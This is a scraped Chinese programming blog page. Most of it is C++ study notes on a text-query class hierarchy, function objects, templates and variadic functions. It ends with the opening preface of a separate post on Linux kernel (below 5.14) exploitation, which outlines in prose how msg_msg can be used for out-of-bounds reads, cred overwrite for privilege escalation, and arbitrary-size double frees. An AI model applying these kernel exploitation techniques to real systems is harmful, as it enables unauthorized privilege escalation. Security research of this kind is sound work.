<span class="built_in">NotQuery</span>(q));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Query <span class="keyword">operator</span>&amp;(<span class="keyword">const</span> Query &amp;l,<span class="keyword">const</span> Query &amp;r) &#123;</span><br><span class="line"><span class="comment">//    this-&gt;q=std::shared_ptr&lt;Query_base&gt;(new AndQuery(*this,r));</span></span><br><span class="line"><span class="comment">//    return *this;</span></span><br><span class="line">    <span class="keyword">return</span> std::shared_ptr&lt;Query_base&gt;(<span class="keyword">new</span> <span class="built_in">AndQuery</span>(l,r));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Query <span class="keyword">operator</span>|(<span class="keyword">const</span> Query &amp;l,<span class="keyword">const</span> Query &amp;r) &#123;</span><br><span class="line">    <span class="keyword">return</span> std::shared_ptr&lt;Query_base&gt;(<span class="keyword">new</span> <span class="built_in">OrQuery</span>(l,r));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Query_base.h</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> INC_1_QUERY_BASE_H</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> INC_1_QUERY_BASE_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Query.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iterator&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Query_base</span>&#123;</span></span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Query</span>;</span></span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">virtual</span> ~<span class="built_in">Query_base</span>()=<span class="keyword">default</span>;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> QueryResult <span class="title">eval</span><span class="params">(TextQuery&amp;)</span> <span class="keyword">const</span></span>=<span class="number">0</span>;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> std::string <span class="title">rep</span><span class="params">()</span> <span class="keyword">const</span> </span>=<span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">WordQuery</span>:</span><span class="keyword">public</span> Query_base&#123;</span><br><span class="line">    <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Query</span>;</span></span><br><span class="line">    <span class="built_in">WordQuery</span>(<span class="keyword">const</span> std::string &amp;s) :<span class="built_in">query_word</span>(s)&#123;&#125;;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(TextQuery &amp;t)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> t.<span class="built_in">query</span>(query_word);</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">std::string <span class="title">rep</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> query_word;</span><br><span class="line">    &#125;;</span><br><span class="line">    std::string query_word;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NotQuery</span>:</span><span class="keyword">public</span> Query_base&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>~(<span class="keyword">const</span> Query&amp;);</span><br><span class="line">    <span class="function">std::string  <span class="title">rep</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;~(&quot;</span>+query.<span class="built_in">rep</span>()+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(TextQuery &amp;t)</span> <span class="keyword">const</span></span>;</span><br><span class="line">    Query query;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="built_in">NotQuery</span>(<span class="keyword">const</span> Query &amp;q): <span class="built_in">query</span>(q)&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BinareyQuery</span> :</span> <span class="keyword">public</span> Query_base&#123;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="built_in">BinareyQuery</span>(<span class="keyword">const</span> Query &amp;l,<span class="keyword">const</span> Query &amp;r,<span class="keyword">const</span> std::string &amp;s):<span class="built_in">lhs</span>(l),<span class="built_in">rhs</span>(r),<span class="built_in">opSym</span>(s)&#123;&#125;;</span><br><span class="line">    <span class="function">std::string  <span class="title">rep</span><span class="params">()</span> <span class="keyword">const</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;(&quot;</span>+lhs.<span class="built_in">rep</span>()+<span class="string">&quot; &quot;</span>+opSym+<span class="string">&quot; &quot;</span>+rhs.<span class="built_in">rep</span>()+<span class="string">&quot;)&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Query lhs,rhs;</span><br><span class="line">    std::string opSym;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AndQuery</span>:</span><span class="keyword">public</span> BinareyQuery&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>&amp;(<span class="keyword">const</span> Query &amp;,<span class="keyword">const</span> Query &amp;);</span><br><span class="line">    <span class="built_in">AndQuery</span>(<span class="keyword">const</span> Query &amp;l,<span class="keyword">const</span> Query &amp;r): <span class="built_in">BinareyQuery</span>(l,r,<span class="string">&quot;&amp;&quot;</span>)&#123;&#125;;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(TextQuery&amp;)</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OrQuery</span>:</span><span class="keyword">public</span> BinareyQuery&#123;</span><br><span class="line">    <span class="keyword">friend</span> Query <span class="keyword">operator</span>|(<span class="keyword">const</span> Query &amp;,<span class="keyword">const</span> Query &amp;);</span><br><span class="line">    <span class="built_in">OrQuery</span>(<span class="keyword">const</span> Query &amp;l,<span class="keyword">const</span> Query &amp;r): <span class="built_in">BinareyQuery</span>(l,r,<span class="string">&quot;|&quot;</span>)&#123;&#125;;</span><br><span class="line">    <span class="function">QueryResult <span class="title">eval</span><span class="params">(TextQuery&amp;)</span> <span class="keyword">const</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">//INC_1_QUERY_BASE_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Query_base.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Query_base.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">QueryResult <span class="title">NotQuery::eval</span><span class="params">(TextQuery &amp;t)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> result=query.<span class="built_in">eval</span>(t);</span><br><span class="line">    <span class="keyword">auto</span> ret_lines= std::make_shared&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt;();</span><br><span class="line">    <span class="keyword">auto</span> beg=result.begin,end=result.end;</span><br><span class="line">    <span class="keyword">auto</span> size=result.<span class="built_in">get_file</span>()-&gt;<span class="built_in">size</span>();</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> n=<span class="number">0</span>;n!=size;n++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(beg==end|| *beg!=n)&#123;</span><br><span class="line">            ret_lines-&gt;<span class="built_in">insert</span>(n);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(beg!=end)&#123;</span><br><span class="line">            ++beg;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),ret_lines,result.<span class="built_in">get_file</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">QueryResult <span class="title">OrQuery::eval</span><span class="params">(TextQuery &amp;test)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> letf=lhs.<span class="built_in">eval</span>(test);</span><br><span class="line">    <span class="keyword">auto</span> right=rhs.<span class="built_in">eval</span>(test);</span><br><span class="line">    <span class="keyword">auto</span> ret_lines=std::make_shared&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt;(letf.begin,letf.end);</span><br><span class="line">    ret_lines-&gt;<span class="built_in">insert</span>(right.begin,right.end);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),ret_lines,letf.<span class="built_in">get_file</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">QueryResult <span class="title">AndQuery::eval</span><span class="params">(TextQuery &amp;test)</span> <span class="keyword">const</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> letf=lhs.<span class="built_in">eval</span>(test);</span><br><span class="line">    <span class="keyword">auto</span> right=rhs.<span class="built_in">eval</span>(test);</span><br><span class="line">    <span class="keyword">auto</span> ret_lines=std::make_shared&lt;std::set&lt;<span class="keyword">int</span>&gt;&gt;();</span><br><span class="line">    std::<span class="built_in">set_intersection</span>(letf.begin,letf.end,right.begin,right.end,std::<span class="built_in">inserter</span>(*ret_lines,ret_lines-&gt;<span class="built_in">begin</span>()));</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">QueryResult</span>(<span class="built_in">rep</span>(),ret_lines,letf.<span class="built_in">get_file</span>());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main.cpp</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Query_base.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    fstream file;</span><br><span class="line">    file.<span class="built_in">open</span>(<span class="string">&quot;./2.txt&quot;</span>,ios::in);</span><br><span class="line">    <span class="keyword">if</span>(!file)&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;open file fail&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    Query q=<span class="built_in">Query</span>(<span class="string">&quot;is&quot;</span>) &amp; <span class="built_in">Query</span>(<span class="string">&quot;that&quot;</span>)|<span class="built_in">Query</span>(<span class="string">&quot;serious&quot;</span>);</span><br><span class="line">    <span class="function">TextQuery <span class="title">textquery</span><span class="params">(file)</span></span>;</span><br><span class="line">    <span class="keyword">auto</span> res=q.<span class="built_in">eval</span>(textquery);</span><br><span class="line">    <span class="built_in">print</span>(cout,res)&lt;&lt;endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>结果</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20230204002217162.png" alt="image-20230204002217162"></p>
<h2 id="运算符类"><a href="#运算符类" class="headerlink" title="运算符类"></a>运算符类</h2><p>运算符类是对运算的一个扩展吧相当于，可以有如下代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plus&lt;<span class="keyword">int</span>&gt; intadd;</span><br><span class="line"><span class="keyword">int</span> s=<span class="built_in">intadd</span>(<span class="number">10</span>,<span class="number">20</span>);</span><br></pre></td></tr></table></figure>

<p>不再是直接使用运算符，而是做了一层封装，这么做的好处就是让运算更加适普。比如两个指针的<code>&lt;</code>操作，不能直接<code>p1&lt;p2</code>这会出问题，但是可以这样</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">less&lt;<span class="keyword">char</span> *&gt; intptrless;</span><br><span class="line"><span class="keyword">bool</span> s=<span class="built_in">intptrless</span>(<span class="string">&quot;123&quot;</span>,<span class="string">&quot;2324&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>这种运算符类是标准库提供的。</p>
<p>使用运算符类进行模板编程会更加类型无关和可移植性。</p>
<h2 id="关于模板函数要在头文件中进行定义的问题"><a href="#关于模板函数要在头文件中进行定义的问题" class="headerlink" title="关于模板函数要在头文件中进行定义的问题"></a>关于模板函数要在头文件中进行定义的问题</h2><p>之前讨论过普通变量或者普通函数能否在头文件中定义的问题，答案是否定的，这是非常愚蠢的行为，但是这条规则在模板编程中不适用，当编译器遇到一个模板定义的时候，他并不会生成代码，只有在当实例化模板的一个特定版本时，编译器才会生成代码，当我们使用而不是定义模板的时候，编译器才会生成代码，这一特性非常重要。假如有如下文件</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add.h</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">add</span><span class="params">(<span class="keyword">const</span> T &amp;a, <span class="keyword">const</span> T &amp;b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="built_in">add</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main.cpp引用了add.h,当使用add(1,1)的时候就需要实例化一个add(int,int)的函数，模板就定义在头文件中，所以可以直接通过头文件实例化，但是如果只有定义在头文件中，而定义在cpp文件中，在链接期间就会报错了。如下代码</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// add.h</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">add</span><span class="params">(<span class="keyword">const</span> T &amp;a, <span class="keyword">const</span> T &amp;b)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// add.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">add</span><span class="params">(<span class="keyword">const</span> T &amp;a, <span class="keyword">const</span> T &amp;b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = <span class="built_in">add</span>(<span class="number">1</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>main函数想要寻找add模板函数并且实例化的时候，发现头文件中只有声明，他就会认为这个函数会在add.cpp中进行实例化，到时候在链接期间进行链接就好了，但是在编译add.cpp这个模块的时候又没有使用add模板函数，也就不会给他实例化，导致最终链接期间，main模块想要链接add模块中的函数，但是add模块没有这个函数，导致链接错误。</p>
<p>那直接在头文件中定义一个模板函数会不会像在头文件中定义一个普通函数那样，在链接的时候爆多重定义的错误。答案是不会的，因为针对特定类型模板函数长的是一样的，所以如果多个模块中都有同一个特性类型的模板函数，那就会随机选择一个并使用。</p>
<h2 id="保证传递给模板的实参支持模板所要求的操作，以及这些操作在模板中能正常工作，是调用者的责任。"><a href="#保证传递给模板的实参支持模板所要求的操作，以及这些操作在模板中能正常工作，是调用者的责任。" class="headerlink" title="保证传递给模板的实参支持模板所要求的操作，以及这些操作在模板中能正常工作，是调用者的责任。"></a>保证传递给模板的实参支持模板所要求的操作，以及这些操作在模板中能正常工作，是调用者的责任。</h2><h2 id="typedef-using"><a href="#typedef-using" class="headerlink" title="typedef using"></a>typedef using</h2><p>typedef主要是起别名的关键字，using除了可以引入命名空间外，还可以起别名，而且还可以给模板起别名，但是typedef不能给模板起别名</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">using</span> Vec = MyVector&lt;T, MyAlloc&lt;T&gt;&gt;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// usage</span></span><br><span class="line">Vec&lt;<span class="keyword">int</span>&gt; vec;</span><br></pre></td></tr></table></figure>

<p>::作用域运算符</p>
<p>众所周知::可以所以类内的static成员或者类内定义的类型，对于一个非模板类来说，通过::引用的是类内的static成员还是类型很好判断，但是如果使用模板类型参数类的名字就不好判断了，在默认情况下c++假定通过::访问的名字不是类型，因此如果使用一个模板参数的类型成员，就得显示的通过关键字typename来实现，如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function"><span class="keyword">typename</span> T::value_type <span class="title">top</span><span class="params">(<span class="keyword">const</span> T&amp; c)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!c.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        <span class="keyword">return</span> c.<span class="built_in">back</span>();</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">typename</span> T::<span class="built_in">value_type</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="模板实例化声明和实例化定义"><a href="#模板实例化声明和实例化定义" class="headerlink" title="模板实例化声明和实例化定义"></a>模板实例化声明和实例化定义</h2><p>实例化声明语法如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="keyword">template</span> <span class="class"><span class="keyword">class</span> <span class="title">Blob</span>&lt;</span>string&gt;;</span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">template</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp;,<span class="keyword">const</span> <span class="keyword">int</span>&amp;)</span></span>;</span><br></pre></td></tr></table></figure>

<p>这就是两个实例化声明，实例化声明是指别的模块中已经实例化了Blob<string>所以没必要在这个模块中再实例化一次，所以进行一个声明，在编译的时候就不会实例化了而是在别的模块中找到这个实例化模板。</p>
<p>实例化定义语法如下</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> <span class="class"><span class="keyword">class</span> <span class="title">Blob</span>&lt;</span>string&gt;;</span><br><span class="line"><span class="function"><span class="keyword">template</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(<span class="keyword">const</span> <span class="keyword">int</span>&amp;,<span class="keyword">const</span> <span class="keyword">int</span>&amp;)</span></span>;</span><br></pre></td></tr></table></figure>

<p>实例化定义是指在这个模块中根据模板实参实例化这个模板。此定义非彼定义。</p>
<p>对于每个实例化声明，在程序中的某个位置必须有其显示的实例化定义。</p>
<h2 id="将实参传递给带模板类型的函数形参时，能够自动应用的类型转换只有const转换以及属猪或者函数指针的转换，但是如果函数参数类型不是模板参数，则对实参进行正常的类型转换。"><a href="#将实参传递给带模板类型的函数形参时，能够自动应用的类型转换只有const转换以及属猪或者函数指针的转换，但是如果函数参数类型不是模板参数，则对实参进行正常的类型转换。" class="headerlink" title="将实参传递给带模板类型的函数形参时，能够自动应用的类型转换只有const转换以及属猪或者函数指针的转换，但是如果函数参数类型不是模板参数，则对实参进行正常的类型转换。"></a>将实参传递给带模板类型的函数形参时，能够自动应用的类型转换只有const转换以及属猪或者函数指针的转换，但是如果函数参数类型不是模板参数，则对实参进行正常的类型转换。</h2><h2 id="引用折叠和右值引用参数"><a href="#引用折叠和右值引用参数" class="headerlink" title="引用折叠和右值引用参数"></a>引用折叠和右值引用参数</h2><p>总结，如果一个函数参数是指向模板参数类型的右值引用，则可以传递给他任意类型的实参，如果将一个优质传递给这个的参数，则函数参数被实例化为一个普通的左值引用。</p>
<p>这个就是c++的例外，不过比较有意思的一点是模板参数可以推断为一个引用类型。</p>
<h2 id="显示的左值引用转化成右值引用"><a href="#显示的左值引用转化成右值引用" class="headerlink" title="显示的左值引用转化成右值引用"></a>显示的左值引用转化成右值引用</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">std::string t=<span class="string">&quot;qwe&quot;</span>;</span><br><span class="line">std::string &amp;&amp;s=static_const&lt;string&amp;&amp;&gt;(t);</span><br></pre></td></tr></table></figure>

<h2 id="可变参数函数模板"><a href="#可变参数函数模板" class="headerlink" title="可变参数函数模板"></a>可变参数函数模板</h2><p>利用递归一个一个处理参数</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">ostream &amp;<span class="title">print</span><span class="params">(ostream &amp;os,<span class="keyword">const</span> T &amp;t)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> os&lt;&lt;t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T,<span class="keyword">typename</span>... Args&gt;</span><br><span class="line"><span class="function">ostream &amp;<span class="title">print</span><span class="params">(ostream &amp;os,<span class="keyword">const</span> T &amp;t,<span class="keyword">const</span> Args&amp;... rest)</span></span>&#123;</span><br><span class="line">    os&lt;&lt;t&lt;&lt;<span class="string">&quot;, &quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">print</span>(os,rest...);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">print</span>(cout,<span class="number">2134</span>,<span class="number">3456</span>,<span class="string">&quot;asfd&quot;</span>,<span class="string">&quot;2134&quot;</span>,<span class="number">123.2345</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="c-基础学习告一段落"><a href="#c-基础学习告一段落" class="headerlink" title="c++基础学习告一段落"></a>c++基础学习告一段落</h2>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/11/20/%E4%BD%8E%E7%89%88%E6%9C%AC-%E4%BD%8E%E4%BA%8E5-14-%E5%9F%BA%E4%BA%8Emsg%E4%B8%8Bdoublefree%E7%9A%84%E5%88%A9%E7%94%A8%E9%80%9A%E8%A7%A3/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/11/20/%E4%BD%8E%E7%89%88%E6%9C%AC-%E4%BD%8E%E4%BA%8E5-14-%E5%9F%BA%E4%BA%8Emsg%E4%B8%8Bdoublefree%E7%9A%84%E5%88%A9%E7%94%A8%E9%80%9A%E8%A7%A3/" class="post-title-link" itemprop="url">低版本(低于5.14)基于msg下doublefree的利用通解</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-11-20 17:47:05 / 修改时间：17:48:25" itemprop="dateCreated datePublished" datetime="2022-11-20T17:47:05+08:00">2022-11-20</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>算是自己研究出的msg的利用的新思路吧，不得不说在kernel版本小于5.14时真的是内核利用的利器，我在多个cve中都看到了msg的身影。在msg的利用中，如果可以控制msg_msg的话，可以轻松完成越界读，一般的msg利用也就是越界读泄露数据，除了任意读如果内核在普通用户下能够使用<code>userfault</code>的话还可以利用msg直接任意写，修改进程的cred来完成权限提升，但是在较高版本下是用户是无法使用<code>userfault</code>的，所以没有办法使用msg直接一把梭的，在较高版本下一般是通过msg泄露地址，然后再找相应大小的结构体劫持·程序流。</p>
<p>但是这种方式比较麻烦的一点是第二步劫持程序流，不同的obj大小要找不同的结构体，而且有些大小的obj还找不到可以利用的结构体，我也以为msg的利用也就到这里，但是在周四午睡起来时忽然灵光乍现，msg不是还可以构造任意free吗，那完全可以利用msg构造出任意size的obj的doublefree啊，就把问题从特定不好利用的size的obj转化成了容易利用的size的obj了，就完全实现了思路上的通解了。</p>
